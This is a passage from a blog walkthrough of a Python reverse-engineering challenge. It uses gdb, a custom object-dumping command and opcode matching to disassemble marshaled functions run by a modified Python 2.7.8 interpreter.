<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">marshal</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span> <span class="o">=</span> <span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s">&#39;c</span><span class="se">\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00</span><span class="s">C</span><span class="se">\x00\x00\x00</span><span class="s">s</span><span class="se">\x14\x00\x00\x00</span><span class="s">d</span><span class="se">\x01\x00\x87\x00\x00</span><span class="s">|</span><span class="se">\x00\x00</span><span class="s">d</span><span class="se">\x01\x00</span><span class="s">&lt;a</span><span class="se">\x00\x00</span><span class="s">|</span><span class="se">\x00\x00\x1b</span><span class="s">(</span><span class="se">\x02\x00\x00\x00</span><span class="s">Ni</span><span class="se">\x01\x00\x00\x00</span><span class="s">(</span><span class="se">\x01\x00\x00\x00</span><span class="s">t</span><span class="se">\x04\x00\x00\x00</span><span class="s">True(</span><span class="se">\x01\x00\x00\x00</span><span class="s">t</span><span class="se">\x0e\x00\x00\x00</span><span class="s">Robert_Forsyth(</span><span class="se">\x00\x00\x00\x00</span><span class="s">(</span><span class="se">\x00\x00\x00\x00</span><span class="s">s</span><span class="se">\x10\x00\x00\x00</span><span class="s">obfuscate/gen.pyt</span><span class="se">\x03\x00\x00\x00</span><span class="s">foo</span><span class="se">\x05\x00\x00\x00</span><span class="s">s</span><span class="se">\x06\x00\x00\x00\x00\x01\x06\x02\n\x01</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_code</span>
</span><span class='line'><span class="s">&#39;d</span><span class="se">\x01\x00\x87\x00\x00</span><span class="s">|</span><span class="se">\x00\x00</span><span class="s">d</span><span class="se">\x01\x00</span><span class="s">&lt;a</span><span class="se">\x00\x00</span><span class="s">|</span><span class="se">\x00\x00\x1b</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_varnames</span>
</span><span class='line'><span class="p">(</span><span class="s">&#39;Robert_Forsyth&#39;</span><span class="p">,)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_names</span>
</span><span class='line'><span class="p">(</span><span class="s">&#39;True&#39;</span><span class="p">,)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can also go further by trying to create a function out of this code object, to call it and/or to disassemble it even:</p>

<figure class='code'><figcaption><span>fuu2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">types</span> <span class="kn">import</span> <span class="n">FunctionType</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'><span class="o">...</span>     <span class="k">pass</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span> <span class="o">=</span> <span class="n">FunctionType</span><span class="p">(</span><span class="n">part_1</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">func_globals</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="p">()</span>
</span><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;obfuscate/gen.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">8</span><span class="p">,</span> <span class="ow">in</span> <span class="n">foo</span>
</span><span class='line'><span class="ne">UnboundLocalError</span><span class="p">:</span> <span class="n">local</span> <span class="n">variable</span> <span class="s">&#39;Robert_Forsyth&#39;</span> <span class="n">referenced</span> <span class="n">before</span> <span class="n">assignment</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">dis</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>  <span class="mi">6</span>           <span class="mi">0</span> <span class="n">LOAD_CONST</span>               <span class="mi">1</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>              <span class="mi">3</span> <span class="n">LOAD_CLOSURE</span>             <span class="mi">0</span>
</span><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">43</span><span class="p">,</span> <span class="ow">in</span> <span class="n">dis</span>
</span><span class='line'>    <span class="n">disassemble</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">107</span><span class="p">,</span> <span class="ow">in</span> <span class="n">disassemble</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;(&#39;</span> <span class="o">+</span> <span class="n">free</span><span class="p">[</span><span class="n">oparg</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;)&#39;</span><span class="p">,</span>
</span><span class='line'><span class="ne">IndexError</span><span class="p">:</span> <span class="nb">tuple</span> <span class="n">index</span> <span class="n">out</span> <span class="n">of</span> <span class="nb">range</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Introducing <em>dpy.py</em></h3>

<p>All right, as expected this does not work at all: seems like the custom interpreter uses different opcodes which the original virtual CPU doesn&rsquo;t know about.
Anyway, let&rsquo;s have a look at this object directly from memory because we like low level things (remember?):</p>

<figure class='code'><figcaption><span>inspecting the code object created</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ p *(PyObject*)$rax
</span><span class='line'>$3 = {ob_refcnt = 0x1, ob_type = 0x7d3da0 &lt;PyCode_Type&gt;}
</span><span class='line'>
</span><span class='line'>; Ok it is a code object, let&#39;s dump entirely the object now
</span><span class='line'>gdb$ p *(PyCodeObject*)$rax
</span><span class='line'>$4 = {
</span><span class='line'>  ob_refcnt = 0x1,
</span><span class='line'>  ob_type = 0x7d3da0 &lt;PyCode_Type&gt;,
</span><span class='line'>  co_argcount = 0x0, co_nlocals = 0x1, co_stacksize = 0x2, co_flags = 0x43,
</span><span class='line'>  co_code = 0x7ffff7f09df0,
</span><span class='line'>  co_consts = 0x7ffff7ee2908,
</span><span class='line'>  co_names = 0x7ffff7f8e390,
</span><span class='line'>  co_varnames = 0x7ffff7f09ed0,
</span><span class='line'>  co_freevars = 0x7ffff7fa7050, co_cellvars = 0x7ffff7fa7050,
</span><span class='line'>  co_filename = 0x7ffff70a9b58,
</span><span class='line'>  co_name = 0x7ffff7f102b0,
</span><span class='line'>  co_firstlineno = 0x5,
</span><span class='line'>  co_lnotab = 0x7ffff7e59900,
</span><span class='line'>  co_zombieframe = 0x0,
</span><span class='line'>  co_weakreflist = 0x0
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, and you can do that for every single field of this structure:</p>

<ul>
<li>to dump the bytecode,</li>
<li>the constants used,</li>
<li>the variable names,</li>
<li>etc.</li>
</ul>


<p>Yes, this is annoying, very much so. That is exactly why there is <em><a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a></em>, a <em>GDB</em> Python command I wrote to dump Python objects in a much easy way directly from memory:</p>

<figure class='code'><figcaption><span>show-casing dpy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ r
</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>[...]
</span><span class='line'>&gt;&gt;&gt; a = { 1 : [1,2,3], &#39;two&#39; : 31337, 3 : (1,&#39;lul&#39;, [3,4,5])}
</span><span class='line'>&gt;&gt;&gt; print hex(id(a))
</span><span class='line'>0x7ffff7ef1050
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7ef1050
</span><span class='line'>dict -&gt; {1: [1, 2, 3], 3: (1, &#39;lul&#39;, [3, 4, 5]), &#39;two&#39;: 31337}
</span></code></pre></td></tr></table></div></figure>


<h3>I need a disassembler now dad</h3>

<p>But let&rsquo;s get back to our second breakpoint now, and see what <em>dpy</em> gives us with the resulting code object:</p>

<figure class='code'><figcaption><span>dpy code object</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ dpy $rax
</span><span class='line'>code -&gt; {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b&#39;,
</span><span class='line'> &#39;co_consts&#39;: (None, 1),
</span><span class='line'> &#39;co_name&#39;: &#39;foo&#39;,
</span><span class='line'> &#39;co_names&#39;: (&#39;True&#39;,),
</span><span class='line'> &#39;co_varnames&#39;: (&#39;Robert_Forsyth&#39;,)}
</span></code></pre></td></tr></table></div></figure>


<p>Because we know the bytecode used by this interpreter is different than the original one, we have to figure out the equivalent between the instructions and their opcodes:</p>

<ol>
<li>Either we can reverse-engineer each handler of the virtual CPU,</li>
<li>Either we can create functions in both interpreters, disassemble those (thanks to <em>dpy</em>) and match the equivalent opcodes</li>
</ol>


<p>I guess we can mix both of them to be more efficient:</p>

<figure class='code'><figcaption><span>deducing equivalent opcodes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Python 2.7.8 (default, Sep  5 2014, 00:13:07)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; def assi(x):
</span><span class='line'>...     x = &#39;hu&#39;
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; def add(x):
</span><span class='line'>...     return x + 31337
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; import dis
</span><span class='line'>&gt;&gt;&gt; dis.dis(assi)
</span><span class='line'>  2           0 LOAD_CONST               1 (&#39;hu&#39;)
</span><span class='line'>              3 STORE_FAST               0 (x)
</span><span class='line'>              6 LOAD_CONST               0 (None)
</span><span class='line'>              9 RETURN_VALUE
</span><span class='line'>&gt;&gt;&gt; dis.dis(add)
</span><span class='line'>  2           0 LOAD_FAST                0 (x)
</span><span class='line'>              3 LOAD_CONST               1 (31337)
</span><span class='line'>              6 BINARY_ADD
</span><span class='line'>              7 RETURN_VALUE
</span><span class='line'>&gt;&gt;&gt; assi.func_code.co_code
</span><span class='line'>&#39;d\x01\x00}\x00\x00d\x00\x00S&#39;
</span><span class='line'>&gt;&gt;&gt; add.func_code.co_code
</span><span class='line'>&#39;|\x00\x00d\x01\x00\x17S&#39;
</span><span class='line'>
</span><span class='line'># In the custom interpreter
</span><span class='line'>
</span><span class='line'>gdb$ r
</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; def assi(x):
</span><span class='line'>...     x = &#39;hu&#39;
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; def add(x):
</span><span class='line'>...     return x + 31337
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; print hex(id(assi))
</span><span class='line'>0x7ffff7f0c578
</span><span class='line'>&gt;&gt;&gt; print hex(id(add))
</span><span class='line'>0x7ffff7f0c5f0
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7f0c578
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00d\x00\x00\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, &#39;hu&#39;),
</span><span class='line'>               &#39;co_name&#39;: &#39;assi&#39;,
</span><span class='line'>               &#39;co_names&#39;: (),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;x&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;assi&#39;}
</span><span class='line'>gdb$ dpy 0x7ffff7f0c5f0
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;\x8f\x00\x00d\x01\x00=\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, 31337),
</span><span class='line'>               &#39;co_name&#39;: &#39;add&#39;,
</span><span class='line'>               &#39;co_names&#39;: (),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;x&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;add&#39;}
</span><span class='line'>
</span><span class='line'> # From here we have:
</span><span class='line'> # 0x64 -&gt; LOAD_CONST
</span><span class='line'> # 0x87 -&gt; STORE_FAST
</span><span class='line'> # 0x1b -&gt; RETURN_VALUE
</span><span class='line'> # 0x8f -&gt; LOAD_FAST
</span><span class='line'> # 0x3d -&gt; BINARY_ADD
</span></code></pre></td></tr></table></div></figure>


<p>OK I think you got the idea, and if you don&rsquo;t manage to find all of them you can just debug the virtual CPU by putting a software breakpoint <em>@0x4b0960</em>:</p>

<figure class='code'><figcaption><span>opcode fetching</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>=&gt; 0x4b0923 &lt;PyEval_EvalFrameEx+867&gt;:   movzx  eax,BYTE PTR [r13+0x0]
</span></code></pre></td></tr></table></div></figure>


<p>For the interested readers: there is at least one interesting opcode that you wouldn&rsquo;t find in a normal Python interpreter, check what <em>0xA0</em> is doing especially when followed by <em>0x87</em> :&ndash;).</p>

<h3>Back to the first marshaled function with all our tooling now</h3>

<p>Thanks to our <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a>, we can now disassemble easily the first part:</p>

<figure class='code'><figcaption><span>disassembling</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\ql-chall-python-2014&gt; python .\disassembler_ql_chall.py
</span><span class='line'>  6           0 LOAD_CONST               1 (1)
</span><span class='line'>              3 STORE_FAST               0 (Robert_Forsyth)
</span><span class='line'>
</span><span class='line'>  8           6 LOAD_GLOBAL              0 (True)
</span><span class='line'>              9 LOAD_CONST               1 (1)
</span><span class='line'>             12 INPLACE_ADD
</span><span class='line'>             13 STORE_GLOBAL             0 (True)
</span><span class='line'>
</span><span class='line'>  9          16 LOAD_GLOBAL              0 (True)
</span><span class='line'>             19 RETURN_VALUE
</span><span class='line'>================================================================================
</span></code></pre></td></tr></table></div></figure>


<p>It seems the author has been really (too) kind with us: the function is really small and we can rewrite it in Python straightaway:</p>

<figure class='code'><figcaption><span>part_1</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">part1</span><span class="p">():</span>
</span><span class='line'>    <span class="k">global</span> <span class="bp">True</span>
</span><span class='line'>    <span class="n">Robert_Forsyth</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="bp">True</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also make sure with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a> that the code of <em>part1</em> is the exact same than the unmarshaled function we dumped earlier.</p>

<figure class='code'><figcaption><span>part_1 successfully decompiled</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&gt;&gt;&gt; def part_1():
</span><span class='line'>...  global True
</span><span class='line'>...  Robert_Forsyth = 1
</span><span class='line'>...  True += 1
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; print hex(id(part_1))
</span><span class='line'>0x7ffff7f0f578
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7f0f578
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00d\x00\x00\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, 1),
</span><span class='line'>               &#39;co_name&#39;: &#39;part_1&#39;,
</span><span class='line'>               &#39;co_names&#39;: (&#39;True&#39;,),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;Robert_Forsyth&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;part_1&#39;}
</span></code></pre></td></tr></table></div></figure>


<h3>Run my bytecode</h3>

<p>The second part is also quite simple according to the following disassembly:</p>

<figure class='code'><figcaption><span>run my bytecode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ disass run_me
</span><span class='line'>Dump of assembler code for function run_me:
</span><span class='line'>[...]
</span><span class='line'>   ; Parses the arguments we gave, it expects a string object
</span><span class='line'>   0x0000000000513da0 &lt;+16&gt;:    lea    rcx,[rsp+0x10]
</span><span class='line'>   0x0000000000513da5 &lt;+21&gt;:    mov    rdx,rsp
</span><span class='line'>   0x0000000000513da8 &lt;+24&gt;:    call   0x4cf430 &lt;PyArg_ParseTuple&gt;
</span><span class='line'>   0x0000000000513dad &lt;+29&gt;:    xor    edx,edx
</span><span class='line'>   0x0000000000513daf &lt;+31&gt;:    test   eax,eax
</span><span class='line'>   0x0000000000513db1 &lt;+33&gt;:    je     0x513e5e &lt;run_me+206&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513db7 &lt;+39&gt;:    mov    rax,QWORD PTR [rip+0x2d4342]
</span><span class='line'>   0x0000000000513dbe &lt;+46&gt;:    mov    esi,0x91
</span><span class='line'>   0x0000000000513dc3 &lt;+51&gt;:    mov    edi,0x56c940
</span><span class='line'>   0x0000000000513dc8 &lt;+56&gt;:    mov    rax,QWORD PTR [rax+0x10]
</span><span class='line'>   0x0000000000513dcc &lt;+60&gt;:    mov    rbx,QWORD PTR [rax+0x30]
</span><span class='line'>
</span><span class='line'>[...]
</span><span class='line'>   ; Part1
</span><span class='line'>[...]
</span><span class='line'>
</span><span class='line'>   0x0000000000513df7 &lt;+103&gt;:   mov    rsi,QWORD PTR [rsp+0x10]
</span><span class='line'>   0x0000000000513dfc &lt;+108&gt;:   mov    rdi,QWORD PTR [rsp]
</span><span class='line'>   ; Uses the string passed as argument to run_me as a marshaled object
</span><span class='line'>   ; PyObject* PyMarshal_ReadObjectFromString(char *string, Py_ssize_t len)
</span><span class='line'>   0x0000000000513e00 &lt;+112&gt;:   call   0x4dc020 &lt;PyMarshal_ReadObjectFromString&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513e05 &lt;+117&gt;:   mov    rsi,rbx
</span><span class='line'>   0x0000000000513e08 &lt;+120&gt;:   mov    rdi,rax
</span><span class='line'>
</span><span class='line'>   ; Creates a function out of it
</span><span class='line'>   0x0000000000513e0b &lt;+123&gt;:   call   0x52c630 &lt;PyFunction_New&gt;
</span><span class='line'>   0x0000000000513e10 &lt;+128&gt;:   xor    edi,edi
</span><span class='line'>   0x0000000000513e12 &lt;+130&gt;:   mov    rbp,rax
</span><span class='line'>   0x0000000000513e15 &lt;+133&gt;:   call   0x478f80 &lt;PyTuple_New&gt;
</span><span class='line'>
</span><span class='line'>   ; Calls it
</span><span class='line'>   ; PyObject* PyObject_Call(PyObject *callable_object, PyObject *args, PyObject *kw)
</span><span class='line'>   0x0000000000513e1a &lt;+138&gt;:   xor    edx,edx
</span><span class='line'>   0x0000000000513e1c &lt;+140&gt;:   mov    rdi,rbp
</span><span class='line'>   0x0000000000513e1f &lt;+143&gt;:   mov    rsi,rax
</span><span class='line'>   0x0000000000513e22 &lt;+146&gt;:   call   0x422b40 &lt;PyObject_Call&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Basically, the string you pass to <em>run_me</em> is treated as a marshaled function: it explains why you get <em>segmentation faults</em> when you call the function with random strings.
We can just <em>jump over</em> that part of the function because we don&rsquo;t really need it so far: <em>set $eip=0x513e27</em> and job done!</p>

<h3>Second &amp; last marshaled function</h3>

<p>By the way I hope you are still reading &mdash; hold tight, we are nearly done!
Let&rsquo;s dump the function object with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a>:</p>

<figure class='code'><figcaption><span>Second part inspection with dpy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
